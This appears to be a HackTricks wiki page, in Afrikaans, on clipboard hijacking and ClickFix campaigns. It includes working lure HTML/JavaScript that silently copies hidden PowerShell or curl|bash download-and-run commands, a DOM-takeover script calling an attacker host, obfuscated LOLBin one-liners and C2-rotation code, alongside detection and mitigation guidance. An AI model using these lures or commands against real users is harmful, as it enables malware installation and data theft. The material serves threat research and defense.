# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige raad

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer en plak sonder om dit te inspekteer. ’n Kwaadwillige webblad (of enige JavaScript-ondersteunende konteks, soos ’n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die stelsel se clipboard. Slagoffers word aangemoedig, gewoonlik deur sorgvuldig saamgestelde sosiale-ingenieursinstruksies, om **Win + R** (Run-dialoog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminale oop te maak en die clipboard-inhoud te *plak*, wat arbitrêre opdragte onmiddellik uitvoer.

Omdat **geen lêer afgelaai of aanhangsel oopgemaak word nie**, omseil die tegniek die meeste e-pos- en webinhoudsekuriteitsbeheermaatreëls wat aanhangsels, makro’s of direkte opdraguitvoering monitor. Die aanval is dus gewild in phishing-veldtogte wat algemene malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer versprei.<sup>[[1]](#references)</sup>

## Clipper-malware wat wallet-adresse vervang

Nog ’n **clipboard hijacking**-variant plak glad nie opdragte nie: dit wag totdat die slagoffer ’n **cryptocurrency-wallet-adres** kopieer en vervang dit dan stilweg met een wat deur die aanvaller beheer word, net voordat dit geplak word. Dit is veral doeltreffend met lang wallet-formate, omdat gebruikers dikwels net die eerste/laaste karakters nagaan.<sup>[[8]](#references)</sup>

Algemene kenmerke in die werklike wêreld:
- **Dun loader + geneste payload**: die sigbare toepassing/exe lyk soos ’n wettige handels- of "wins"-hulpmiddel, terwyl die werklike clipper dieper in die pakket versteek is (byvoorbeeld ’n .NET loader wat ’n geneste Rust-payload begin).
- **Regex-gedrewe vervanging**: die malware pas by stringe soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-karakter Solana-agtige** stringe en herskryf dit na die aanvaller se wallets.
- **Wallet-rotasie op groot skaal**: moderne Windows-monsters kan **duisende** vervangingswallets per geldeenheid insluit, in plaas van ’n enkele statiese adres, wat die afname in wallet-reputasie ná elke diefstal beperk.<sup>[[8]](#references)</sup>

### Windows-clipper-vloei

’n Algemene implementering is ’n versteekte venster wat met **`AddClipboardFormatListener`** geregistreer is. By elke clipboard-opdatering roep die malware gewoonlik:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → verkry toegang tot die huidige clipboard-data.
- **`GetClipboardData`** → lees teks.
- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet-string met die aanvaller se waarde.

Minimale hunting-regexes wat gereeld in clippers voorkom:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Gebruikersvlak-persistentie is genoeg vir impak. Een waargenome patroon is:<sup>[[8]](#references)</sup>
- Kopieer payload na **`%APPDATA%\silke\silke.exe`**
- Skep ’n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Opsporingsidees:
- Prosesse wat voortdurend clipboard-API’s aanroep terwyl hulle ook na `%APPDATA%` en die gebruiker se **Startup**-lêergids skryf.
- Nuwe LNK-/uitvoerbare-lêerskepping, gevolg deur clipboard-herskrywings van wallet-adresse.
- Argiewe of vals sagtewarebundels wat baie ongebruikte lêers bevat, plus ’n klein launcher wat ’n geneste binêre lêer begin.

### Sosiaal-gemanipuleerde quarantine-verwydering + LaunchAgent-persistentie op macOS

Op macOS lewer sommige veldtogte ’n **`unlocker.command`**-helper en gee die slagoffer opdrag om regs te klik → **Open** as Gatekeeper sê die app is beskadig of van ’n onbekende ontwikkelaar afkomstig. Die script verwyder bloot quarantine en begin die nabygeleë `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

This is **nie** ’n Gatekeeper exploit nie; dit is ’n **sosiaal-gemanipuleerde quarantine bypass** wat misbruik maak van die feit dat Gatekeeper-besluite van die `com.apple.quarantine` xattr afhang.<sup>[[8]](#references)</sup>

Ná uitvoering kan die clipper as die huidige gebruiker volhard deur die volgende te skryf:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent met `RunAtLoad` en `KeepAlive`

’n Nuttige verdedigingsdetail is dat sommige monsters ’n **self-healing watchdog** implementeer wat die LaunchAgent en wrapper ongeveer elke 30 sekondes herskryf. As jy eers die plist verwyder **sonder om die lopende proses te beëindig**, kan die malware dit onmiddellik herskep.<sup>[[8]](#references)</sup> Veilige opruimvolgorde:
1. Beëindig die aktiewe clipper-proses.
2. Ontlaai/verwyder die LaunchAgent-plist.
3. Verwyder `~/launch.sh` en die gekopieerde payload.

### Afleweringsnota: vals reputasie as kragvermenigvuldiger

Vir hierdie familie kan die malware self tegnies eenvoudig bly, terwyl die **verspreidingslaag** die swaar werk doen: vals GitHub-sterre/-forks, SourceForge-resensies/-aflaaie, YouTube-tutoriaalopmerkings/-kyke en onskadelik lykende VirusTotal-opmerkings/-stemme word gebruik om die binêre lêer betroubaar te laat lyk voordat dit uitgevoer word.<sup>[[8]](#references)</sup>

## Geforseerde Copy-knoppies en versteekte payloads (macOS one-liners)

Sommige macOS-infostealers kloon installerwebwerwe (bv. Homebrew) en **dwing die gebruik van ’n “Copy”-knoppie af** sodat gebruikers nie net die sigbare teks kan uitlig nie. Die knipbordinvoer bevat die verwagte installer-opdrag plus ’n aangehegte Base64-payload (bv. `...; echo <b64> | base64 -d | sh`), sodat een plakaksie albei uitvoer terwyl die UI die ekstra stadium versteek.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Ouer veldtogte het `document.execCommand('copy')` gebruik; nuwer veldtogte maak staat op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Die ClickFix / ClearFake-vloei

1. Gebruiker besoek ’n typosquatted of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingevoegde **ClearFake** JavaScript roep ’n `unsecuredCopyToClipboard()`-helper aan wat stilweg ’n Base64-gekodeerde PowerShell-eenlynopdrag in die knipbord stoor.
3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer en laai ’n argief af wat ’n wettige uitvoerbare lêer plus ’n kwaadwillige DLL bevat (klassieke DLL-sideloading).
5. Die loader dekripteer bykomende stadiums, spuit shellcode in en installeer volharding (bv. ’n geskeduleerde taak) – wat uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer laat loop.<sup>[[1]](#references)</sup>

### Voorbeeld van ’n NetSupport RAT-ketting

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimate Java WebStart) soek in sy gids na `msvcp140.dll`.
* Die kwaadwillige DLL los API's dinamies op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met ’n rollende XOR-sleutel `"https://google.com/"`, spuit die finale shellcode in en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript-downloader binne **cscript.exe** uit
3. Haal ’n MSI-payload op → plaas `libcef.dll` langs ’n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Die **mshta**-aanroep begin ’n versteekte PowerShell-skrip wat `PartyContinued.exe` ophaal, `Boat.pst` (CAB) uitpak, `AutoIt3.exe` met `extrac32` en lêersamevoeging herbou en uiteindelik ’n `.a3x`-skrip uitvoer wat blaaierbewyse na `sumeriavgv.digital` eksfiltreer.<sup>[[1]](#references)</sup>

## ClickFix: Klembord → PowerShell → JS eval → Opstart-LNK met roterende C2 (PureHVNC)

Sommige ClickFix-veldtogte slaan lêeraflaaie heeltemal oor en gee slagoffers opdrag om ’n eenreël-opdrag te plak wat JavaScript via WSH ophaal en uitvoer, dit volhardend maak en C2 daagliks roteer. Voorbeeld van ’n waargenome ketting:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Sleutelkenmerke
- Verdoeselde URL word tydens looptyd omgekeer om terloopse inspeksie te verydel.
- JavaScript behou volharding via 'n Startup LNK (WScript/CScript) en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.<sup>[[3]](#references)</sup>

Minimale JS-fragment wat gebruik word om C2's volgens datum te roteer:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Die volgende stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT (bv. PureHVNC) aflaai, dikwels met TLS-pinning aan ’n hardgekodeerde sertifikaat en verkeer wat in stukke verdeel word.<sup>[[3]](#references)</sup>

Opsporingsidees spesifiek vir hierdie variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Opstartartefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met ’n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Register-/RunMRU- en opdragreël-telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-loë om lang skripte uit te voer sonder lang opdragreëls.
- Geskeduleerde take wat daarna LOLBins uitvoer, soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, onder ’n taak/pad wat soos ’n updater lyk (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2-gasheername en URL’s wat daagliks roteer, met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korrelasie tussen knipbordskryfgebeurtenisse, gevolg deur Win+R-plak en onmiddellike uitvoering van `powershell.exe`.

Blou spanne kan knipbord-, proses-skepping- en registertelemetrie kombineer om pastejacking-misbruik vas te stel:

* Windows-register: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-opdragte by – soek na ongewone Base64-/verdoeselde inskrywings.
* Sekuriteitsgebeurtenis-ID **4688** (prosesskepping) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } is.
* Gebeurtenis-ID **4663** vir lêers wat onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers geskep word, net voor die verdagte 4688-gebeurtenis.
* EDR-knipbordsensors (indien beskikbaar) – korreleer `Clipboard Write` wat onmiddellik gevolg word deur ’n nuwe PowerShell-proses.

## IUAM-styl verifikasiebladsye (ClickFix Generator): knipbordkopiëring-na-konsole + OS-bewuste loonvragte

Onlangse veldtogte vervaardig op groot skaal vals CDN-/blaaierverifikasiebladsye ("Just a moment…", IUAM-styl) wat gebruikers dwing om OS-spesifieke opdragte vanaf hul knipbord na inheemse konsoles te kopieer. Dit verskuif die uitvoering buite die blaaier-sandput en werk op Windows en macOS.<sup>[[4]](#references)</sup>

Belangrike eienskappe van bladsye wat deur die bouer gegenereer word
- OS-opsporing via `navigator.userAgent` om loonvragte aan te pas (Windows PowerShell/CMD teenoor macOS Terminal). Opsionele lokmiddels/geenaksies vir onondersteunde OS’e handhaaf die illusie.
- Outomatiese knipbordkopiëring tydens onskadelike UI-aksies (merkblokkie/Kopieer), terwyl die sigbare teks van die knipbordinhoud kan verskil.
- Mobiele toestelle word geblokkeer en ’n opspringvenster gee stap-vir-stap-instruksies: Windows → Win+R→plak→Enter; macOS → maak Terminal oop→plak→Enter.
- Opsionele verdoeseling en ’n enkel-lêer-inspuiter om ’n gekompromitteerde webwerf se DOM te vervang met ’n Tailwind-stylverifikasie-UI (geen nuwe domeinregistrasie nodig nie).<sup>[[4]](#references)</sup>

Voorbeeld: knipbordwanpassing + OS-bewuste vertakking
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS-volharding van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminal sluit, wat sigbare artefakte verminder.<sup>[[4]](#references)</sup>

In-place-bladsy-oorname op gekompromitteerde webwerwe
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Idees vir opsporing en soektogte wat spesifiek op IUAM-styl-lokmiddele gemik is
- Web: Bladsye wat Clipboard API aan verifikasie-widgets koppel; verskil tussen die vertoonde teks en die inhoud van die knipbord; vertakking op grond van `navigator.userAgent`; Tailwind + vervanging van ’n enkelbladsy in verdagte kontekste.
- Windows-eindpunt: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaierinteraksie; batch-/MSI-installeerders wat vanaf `%TEMP%` uitgevoer word.
- macOS-eindpunt: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` naby blaaiergebeure begin; agtergrondtake wat aanhou loop nadat die terminale venster toegemaak is.
- Korreleer `RunMRU`-geskiedenis van Win+R en knipbordskrywes met daaropvolgende konsole-prosesse.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evolusies van vals CAPTCHA / ClickFix in 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake kompromitteer steeds WordPress-webwerwe en spuit loader-JavaScript in wat eksterne gashere (Cloudflare Workers, GitHub/jsDelivr) in ’n ketting skakel, en selfs blockchain-“etherhiding”-oproepe doen (bv. POST-versoeke na Binance Smart Chain API-eindpunte soos `bsc-testnet.drpc[.]org`) om die nuutste lokmiddel-logika op te haal. Onlangse oorlegsels gebruik baie vals CAPTCHA’s wat gebruikers opdrag gee om ’n eenreël-opdrag te kopieer/plak (T1204.004) eerder as om enigiets af te laai.<sup>[[6]](#references)</sup>
- Aanvanklike uitvoering word toenemend aan ondertekende script-gashere/LOLBAS gedelegeer. Kettings in Januarie 2026 het vroeëre gebruik van `mshta` vervang met die ingeboude `SyncAppvPublishingServer.vbs`, wat via `WScript.exe` uitgevoer word en PowerShell-agtige argumente met aliasse/wildcards deurgee om afgeleë inhoud op te haal:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` is onderteken en word gewoonlik deur App-V gebruik; in kombinasie met `WScript.exe` en ongewone argumente (`gal`/`gcm`-aliasse, cmdlets met jokertekens, jsDelivr-URL’s) word dit ’n LOLBAS-stadium met ’n sterk sein vir ClearFake.<sup>[[6]](#references)</sup>
- In Februarie 2026 het vervalste CAPTCHA-loonvragte teruggeskuif na suiwer PowerShell-aflaaikrame. Twee aktiewe voorbeelde:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Die eerste ketting is ’n in-memory `iex(irm ...)`-grabber; die tweede gebruik `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`-lêer en begin dit dan met `-ep bypass` in ’n versteekte venster.<sup>[[6]](#references)</sup>

Opsporings-/jagtips vir hierdie variante
- Proseslyn: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell-cradles onmiddellik ná knipbordskrywings/Win+R.
- Sleutelwoorde op die opdragreël: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker-domeine, of patrone met rou IP-adresse en `iex(irm ...)`.
- Netwerk: uitgaande versoeke na CDN-worker-gashere of blockchain-RPC-eindpunte vanaf scriptgashere/PowerShell kort ná webblaai.
- Lêer/register: tydelike `.ps1`-lêers wat onder `%TEMP%` geskep word, plus RunMRU-inskrywings wat hierdie eenreëls bevat; blokkeer/waarsku oor signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URL’s of verduisterde alias-stringe uitgevoer word.

## ClickFix tradecraft van Junie 2026: plaktelemetrie, vals verifikasiekommentaar en LOLBin-kettings

Onlangse Red Canary-telemetrie toon dat die bestendige aanwyser **nie een spesifieke opdrag is nie**, maar die kombinasie van **plak-en-uitvoer met die gebruiker se hulp**, **vertroude interpreteerders/LOLBins**, **verduisterde vlae**, **afstandherwinning** en **onmiddellike uitvoering**.<sup>[[7]](#references)</sup>

### Noemenswaardige operateurpatrone

- **Plakbevestigingstelemetrie**: sommige payloads voer `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` uit voordat die werklike stadium begin. Dit bevestig gebruikersinteraksie terwyl die venster kort en stil gehou word.
- **Vals verifikasiekommentaar**: PowerShell-eenreëls kan stringe soos `# Security check ✔️ I'm not a robot Verification ID: 138105` byvoeg sodat die opdrag steeds CAPTCHA-verwant lyk nadat dit in Run / `cmd.exe` / PowerShell se geskiedenis geplak is.
- **Dinamiese URL-heropbou**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermy ’n statiese URL op die opdragreël, terwyl dit steeds aflaai-en-uitvoer in geheue uitvoer.
- **Vermomde installeerderuitvoering**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` misbruik ongewone hooflettergebruik en Unicode-agtige karakters in vlae om rigiede opsporing te omseil, terwyl dit steeds soos `msiexec.exe` lyk.
- **Caret-ontsnapte LOLBin-kettings**: `cmd.exe` kan sleutelwoorde met `^`-ontsnappings versteek (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die geneste shell geminimaliseer begin, aanvallerinhoud met ’n onskadelike uitbreiding soos `.pdf` stoor en dit dan deur `mshta` uitvoer.<sup>[[7]](#references)</sup>
## Versagtings

1. Verharding van browser – deaktiveer knipbordskryftoegang (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis ’n gebruikersgebaar.
2. Sekuriteitsbewustheid – leer gebruikers om sensitiewe opdragte te *tik* of dit eers in ’n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrêre eenreëls te blokkeer.
4. Netwerkbeheer – blokkeer uitgaande versoeke na bekende pastejacking- en malware-C2-domeine.

## Verwante truuks

* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat gebruikers na ’n kwaadwillige bediener gelok is:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Herstel die klik: voorkoming van die ClickFix-aanvalsvektor](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Onder die suiwer gordyn: van RAT tot bouer tot kodeerder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Die ClickFix-fabriek: eerste onthulling van IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligensie-insigte: Februarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligensie-insigte: Junie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Van sterre tot opstemme: vals reputasie wat ’n kripto-knipbordkaper aandryf](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
